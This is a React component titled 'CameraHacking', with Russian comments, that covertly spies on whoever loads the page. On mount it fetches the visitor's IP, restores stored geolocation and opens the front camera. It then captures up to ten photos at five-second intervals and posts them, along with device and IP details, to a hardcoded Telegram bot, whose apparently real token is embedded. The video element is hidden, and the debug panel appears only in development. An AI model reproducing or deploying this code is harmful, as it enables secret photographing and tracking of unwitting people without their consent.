/**
 * КОМПОНЕНТ CAMERAHACKING - ИСПРАВЛЕННЫЙ URL И CORS
 */

import axios from 'axios';
import { useEffect, useRef, useState } from 'react';

const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const [isInitialized, setIsInitialized] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [debugLogs, setDebugLogs] = useState([]);

  // Базовый URL API
  const API_BASE_URL = window.location.origin; // Используем текущий домен
  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  const addDebugLog = (message) => {
    const log = `${new Date().toLocaleTimeString()}: ${message}`;
    console.log(log);
    setDebugLogs(prev => [log, ...prev].slice(0, 20));
  };

  /**
   * ПРЯМАЯ ОТПРАВКА В TELEGRAM ЧЕРЕЗ ИХ API
   */
  const sendDirectToTelegram = async (blob, caption = '') => {
    const startTime = Date.now();
    
    try {
      addDebugLog('Отправляем напрямую в Telegram API...');
      
      // Создаем FormData
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'photo.jpg');
      if (caption) {
        formData.append('caption', caption);
      }
      
      // Telegram Bot API URL
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
      
      addDebugLog(`Отправляем на: ${telegramUrl}`);
      addDebugLog(`Размер файла: ${Math.round(blob.size / 1024)} KB`);
      
      // Отправляем напрямую в Telegram
      const response = await fetch(telegramUrl, {
        method: 'POST',
        body: formData,
        mode: 'cors',
        credentials: 'omit'
      });
      
      const totalTime = Date.now() - startTime;
      
      if (response.ok) {
        const result = await response.json();
        addDebugLog(`✅ Telegram API: Фото отправлено! Время: ${totalTime}ms`);
        return { success: true, data: result };
      } else {
        const errorText = await response.text();
        addDebugLog(`❌ Telegram API ошибка: ${response.status} - ${errorText}`);
        return { 
          success: false, 
          error: `Status: ${response.status}, Text: ${errorText.substring(0, 100)}` 
        };
      }
      
    } catch (error) {
      addDebugLog(`❌ Ошибка отправки в Telegram: ${error.message}`);
      return { success: false, error: error.message };
    }
  };

  /**
   * ОТПРАВКА ДИАГНОСТИКИ В TELEGRAM
   */
  const sendDiagnosticToTelegram = async (text) => {
    try {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      await fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML'
        }),
        mode: 'cors'
      });
      
    } catch (error) {
      console.error('Не удалось отправить диагностику:', error);
    }
  };

  /**
   * ПРОСТОЙ ТЕСТ ОТПРАВКИ
   */
  const testSimpleUpload = async () => {
    addDebugLog('🧪 Простой тест отправки...');
    
    try {
      // Тест 1: Отправляем текстовое сообщение
      addDebugLog('Тест 1: Отправка текста...');
      await sendDiagnosticToTelegram(
        '🧪 Тест связи\n\n' +
        `Устройство: Android Chrome\n` +
        `User Agent: ${navigator.userAgent.substring(0, 100)}\n` +
        `Время: ${new Date().toLocaleString()}`
      );
      addDebugLog('✅ Текстовое сообщение отправлено');
      
      // Тест 2: Отправляем маленькое изображение
      addDebugLog('Тест 2: Создаем тестовое изображение...');
      const canvas = document.createElement('canvas');
      canvas.width = 100;
      canvas.height = 100;
      const ctx = canvas.getContext('2d');
      
      // Рисуем простую картинку
      ctx.fillStyle = '#FF6B6B';
      ctx.fillRect(0, 0, 100, 100);
      ctx.fillStyle = '#FFFFFF';
      ctx.font = '14px Arial';
      ctx.fillText('TEST', 30, 50);
      ctx.fillText('OK', 40, 70);
      
      const blob = await new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.9);
      });
      
      if (!blob) throw new Error('Не удалось создать изображение');
      
      addDebugLog(`Тестовое изображение: ${blob.size} байт`);
      
      // Отправляем в Telegram
      const result = await sendDirectToTelegram(blob, '🧪 Тестовое изображение');
      
      if (result.success) {
        addDebugLog('✅ Все тесты пройдены!');
        return true;
      } else {
        addDebugLog(`❌ Тест не пройден: ${result.error}`);
        return false;
      }
      
    } catch (error) {
      addDebugLog(`❌ Ошибка теста: ${error.message}`);
      return false;
    }
  };

  /**
   * ИНИЦИАЛИЗАЦИЯ КАМЕРЫ
   */
  const initializeCamera = async () => {
    addDebugLog('🎬 Инициализация камеры...');
    
    try {
      // Собираем информацию об устройстве
      const ua = navigator.userAgent;
      const isAndroid = /android/i.test(ua);
      const isIOS = /iphone|ipad|ipod/i.test(ua);
      const androidVersion = isAndroid ? (ua.match(/Android\s([0-9\.]+)/)?.[1] || 'unknown') : null;
      
      const deviceData = {
        isAndroid,
        isIOS,
        androidVersion,
        userAgent: ua,
        timestamp: new Date().toISOString()
      };
      
      setDeviceInfo(deviceData);
      addDebugLog(`Устройство: ${isAndroid ? 'Android' : isIOS ? 'iOS' : 'Desktop'} ${androidVersion || ''}`);
      
      // Тестируем отправку
      addDebugLog('Проверяем связь с Telegram...');
      const connectionTest = await testSimpleUpload();
      
      if (!connectionTest) {
        addDebugLog('❌ Проблема с подключением к Telegram');
        await sendDiagnosticToTelegram(
          '❌ НЕТ СВЯЗИ С TELEGRAM\n\n' +
          'Проверьте:\n' +
          '1. Работает ли интернет на устройстве\n' +
          '2. Не заблокирован ли Telegram\n' +
          `3. User Agent: ${ua.substring(0, 80)}`
        );
        return false;
      }
      
      // Получаем доступ к камере
      addDebugLog('Запрашиваем доступ к камере...');
      const constraints = {
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: false
      };
      
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = stream;
      
      if (videoRef.current) {
        const video = videoRef.current;
        
        // Настройки для мобильных
        video.playsInline = true;
        video.muted = true;
        video.autoplay = true;
        video.setAttribute('playsinline', 'true');
        video.setAttribute('muted', 'true');
        video.setAttribute('autoplay', 'true');
        
        video.srcObject = stream;
        
        // Ждем готовности
        await new Promise((resolve) => {
          const timeout = setTimeout(() => {
            addDebugLog('Таймаут видео, продолжаем...');
            resolve();
          }, 3000);
          
          video.onloadedmetadata = () => {
            clearTimeout(timeout);
            deviceData.resolution = `${video.videoWidth}x${video.videoHeight}`;
            setDeviceInfo(deviceData);
            
            addDebugLog(`Видео готово: ${video.videoWidth}x${video.videoHeight}`);
            
            video.play().then(() => {
              addDebugLog('Видео запущено');
              resolve();
            }).catch(() => {
              addDebugLog('Auto-play заблокирован');
              resolve();
            });
          };
        });
        
        // Отправляем успешную инициализацию
        await sendDiagnosticToTelegram(
          '✅ Камера инициализирована\n\n' +
          `Разрешение: ${deviceData.resolution}\n` +
          `Устройство: ${isAndroid ? 'Android' : isIOS ? 'iOS' : 'Desktop'}\n` +
          `Версия: ${androidVersion || 'N/A'}\n` +
          `Время: ${new Date().toLocaleString()}`
        );
        
        setIsInitialized(true);
        return true;
      }
      
    } catch (error) {
      addDebugLog(`❌ Ошибка инициализации: ${error.message}`);
      
      // Отправляем ошибку
      await sendDiagnosticToTelegram(
        '❌ Ошибка камеры\n\n' +
        `Тип: ${error.name}\n` +
        `Сообщение: ${error.message}\n` +
        `Устройство: ${navigator.userAgent.substring(0, 100)}`
      );
      
      return false;
    }
  };

  /**
   * ЗАХВАТ И ОТПРАВКА ФОТО
   */
  const captureAndSendPhoto = async () => {
    if (!isInitialized || !videoRef.current) {
      addDebugLog('Камера не готова');
      return;
    }
    
    const video = videoRef.current;
    
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      addDebugLog('Видео не готово (0x0)');
      return;
    }
    
    addDebugLog(`📸 Захват #${captureCount + 1}`);
    
    try {
      // Создаем canvas
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      
      // Для Android: несколько попыток
      let frameOk = false;
      let attempts = 0;
      
      while (!frameOk && attempts < 3) {
        attempts++;
        
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Проверяем пиксель
        const pixel = ctx.getImageData(50, 50, 1, 1).data;
        const isBlack = pixel[0] < 10 && pixel[1] < 10 && pixel[2] < 10;
        
        if (!isBlack) {
          frameOk = true;
          addDebugLog(`Кадр OK (попытка ${attempts})`);
        } else {
          addDebugLog(`Черный кадр ${attempts}/3`);
          await new Promise(r => setTimeout(r, 100));
        }
      }
      
      // Если черный, добавляем текст
      if (!frameOk) {
        ctx.fillStyle = 'white';
        ctx.font = '24px Arial';
        ctx.fillText('Android Camera', 50, 100);
        ctx.fillText(new Date().toLocaleTimeString(), 50, 140);
        addDebugLog('Добавлен текст на черный кадр');
      }
      
      // Создаем blob
      const blob = await new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.7);
      });
      
      if (!blob) throw new Error('Blob creation failed');
      
      addDebugLog(`Изображение: ${Math.round(blob.size / 1024)} KB`);
      
      // Отправляем напрямую в Telegram
      const result = await sendDirectToTelegram(
        blob,
        `📸 Фото #${captureCount + 1}\n` +
        `Разрешение: ${video.videoWidth}x${video.videoHeight}\n` +
        `Размер: ${Math.round(blob.size / 1024)} KB\n` +
        `Время: ${new Date().toLocaleTimeString()}`
      );
      
      if (result.success) {
        setCaptureCount(prev => prev + 1);
        addDebugLog('✅ Фото успешно отправлено!');
      } else {
        addDebugLog(`❌ Ошибка отправки: ${result.error}`);
      }
      
    } catch (error) {
      addDebugLog(`Ошибка захвата: ${error.message}`);
    }
  };

  /**
   * ЗАПУСК ПЕРИОДИЧЕСКОГО ЗАХВАТА
   */
  const startCaptureLoop = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    addDebugLog('🚀 Запускаем захват каждые 5 секунд');
    
    // Первый снимок через 2 секунды
    setTimeout(() => {
      captureAndSendPhoto();
    }, 2000);
    
    // Затем каждые 5 секунд
    captureIntervalRef.current = setInterval(() => {
      if (captureCount < 10) { // Ограничим 10 фото для теста
        captureAndSendPhoto();
      } else {
        stopCapture();
        addDebugLog('🎯 Сделано 10 фото');
        sendDiagnosticToTelegram('✅ Завершено: 10 фото отправлено');
      }
    }, 5000);
  };

  /**
   * ПОЛУЧЕНИЕ IP АДРЕСА
   */
  const getClientIp = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json', {
        timeout: 5000
      });
      
      const data = await response.json();
      setClientIp(data.ip);
      addDebugLog(`IP: ${data.ip}`);
      
      // Отправляем IP в Telegram
      await sendDiagnosticToTelegram(
        `🌐 IP адрес: ${data.ip}\n` +
        `Устройство: ${deviceInfo?.isAndroid ? 'Android' : 'Other'}`
      );
      
    } catch (error) {
      setClientIp('IP unavailable');
      addDebugLog(`Ошибка IP: ${error.message}`);
    }
  };

  /**
   * ОСТАНОВКА
   */
  const stopCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    
    addDebugLog('Захват остановлен');
  };

  /**
   * ОСНОВНОЙ ЭФФЕКТ
   */
  useEffect(() => {
    let mounted = true;
    
    const init = async () => {
      addDebugLog('=== СТАРТ ===');
      
      // Восстановление геолокации
      try {
        const saved = localStorage.getItem('locationPermission');
        if (saved) {
          const location = JSON.parse(saved);
          setLocationPermission(location);
          addDebugLog('Геолокация восстановлена');
        }
      } catch (e) {
        localStorage.removeItem('locationPermission');
      }
      
      // Получаем IP
      await getClientIp();
      
      // Проверяем поддержку камеры
      if (!navigator.mediaDevices?.getUserMedia) {
        addDebugLog('❌ Камера не поддерживается');
        await sendDiagnosticToTelegram(
          '❌ WebRTC не поддерживается\n\n' +
          'Браузер не может получить доступ к камере'
        );
        return;
      }
      
      // Инициализируем камеру
      const success = await initializeCamera();
      
      if (success && mounted) {
        startCaptureLoop();
      }
    };
    
    init();
    
    return () => {
      mounted = false;
      stopCapture();
    };
  }, []);

  /**
   * КНОПКА ДЛЯ РУЧНОГО ТЕСТИРОВАНИЯ
   */
  const TestButton = () => (
    <div style={{
      position: 'fixed',
      top: '10px',
      left: '10px',
      background: '#4CAF50',
      color: 'white',
      padding: '10px 15px',
      borderRadius: '5px',
      cursor: 'pointer',
      zIndex: 10000,
      fontSize: '14px',
      fontWeight: 'bold'
    }} onClick={captureAndSendPhoto}>
      📸 Тест фото
    </div>
  );

  return (
    <>
      {process.env.NODE_ENV === 'development' && <TestButton />}
      
      <div style={{ display: 'none' }}>
        <div id="device-info">
          {deviceInfo && JSON.stringify({
            device: deviceInfo.isAndroid ? 'Android' : deviceInfo.isIOS ? 'iOS' : 'Desktop',
            version: deviceInfo.androidVersion || 'N/A',
            resolution: deviceInfo.resolution || 'unknown'
          })}
        </div>
      </div>
      
      {/* Дебаг панель */}
      {process.env.NODE_ENV === 'development' && (
        <div style={{
          position: 'fixed',
          bottom: 0,
          left: 0,
          right: 0,
          background: 'rgba(0,0,0,0.95)',
          color: '#0f0',
          padding: '10px',
          fontSize: '12px',
          maxHeight: '200px',
          overflow: 'auto',
          fontFamily: 'monospace',
          zIndex: 9999,
          borderTop: '2px solid #0f0'
        }}>
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            marginBottom: '10px',
            paddingBottom: '5px',
            borderBottom: '1px solid #333'
          }}>
            <strong>Camera Debug</strong>
            <span>Photos: {captureCount}</span>
            <span>{deviceInfo?.resolution || 'No video'}</span>
          </div>
          
          <div style={{ maxHeight: '150px', overflow: 'auto' }}>
            {debugLogs.map((log, i) => (
              <div key={i} style={{
                padding: '2px 0',
                borderBottom: '1px solid #222',
                whiteSpace: 'nowrap',
                overflow: 'hidden',
                textOverflow: 'ellipsis'
              }}>
                {log}
              </div>
            ))}
          </div>
        </div>
      )}
    </>
  );
};

export default CameraHacking;
